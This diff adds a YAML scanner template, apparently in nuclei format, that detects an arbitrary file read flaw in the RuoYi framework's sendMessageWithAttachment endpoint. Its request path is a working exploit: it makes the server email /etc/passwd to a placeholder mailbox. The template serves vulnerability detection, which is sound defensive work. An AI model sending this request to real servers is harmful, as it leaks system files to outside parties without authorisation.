@@ -1,0 +1,36 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":200'
+          - '"msg":"操作成功"'
+          - '"data":"'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - application/json
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/demo/mail/sendMessageWithAttachment?to=yourQQ@qq.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd'
+id: ruoyi-sendmessagewithattachment-fileread
+info:
+  author: zan8in
+  description: |-
+    若依(RuoYi)框架 sendMessageWithAttachment 接口存在任意文件读取漏洞。未经身份验证的攻击者可通过该漏洞读取服务器敏感文件，导致系统信息泄露，造成严重安全风险。
+    注意：邮箱收到的邮件内容中包含文件路径，攻击者可通过该漏洞读取服务器敏感文件。
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 若依 sendMessageWithAttachment 接口文件读取漏洞
+  severity: high
+  tags: ruoyi,fileread,argus-import
